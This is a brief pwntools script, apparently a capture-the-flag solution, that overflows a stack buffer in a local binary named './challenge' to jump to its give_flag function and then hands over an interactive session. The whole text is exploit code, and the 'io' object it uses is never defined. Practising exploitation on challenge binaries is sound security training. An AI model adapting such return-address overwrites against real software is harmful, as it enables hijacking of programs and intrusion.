from pwn import *

BIN = "./challenge"

giveflag = 0x80485ab


def exploit():
	payload = b"a"*0x10 + b"b"*0x4 + p32(giveflag)
	io.recvuntil("&give_flag = 0x80485ab")
	io.sendline(payload)
	io.interactive()